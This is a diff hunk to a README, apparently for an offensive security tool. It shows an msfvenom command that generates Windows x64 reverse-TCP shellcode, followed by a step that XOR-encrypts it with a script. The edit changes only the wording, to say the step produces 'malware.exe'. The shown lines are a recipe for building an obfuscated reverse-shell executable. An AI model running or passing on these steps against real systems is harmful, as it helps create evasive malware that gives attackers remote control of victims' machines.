@@ -10,7 +10,7 @@ Run this command to generate the shellcode via Msfvenom.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw -o payload.bin
 ```
 ##### Encrypt The Generated Payload 
-Run this command to encrypt the generated shellcode.
+Run this command to encrypt the generated shellcode and generating `malware.exe`.
 ```sh
 python3 xorencrypt.py
 ```
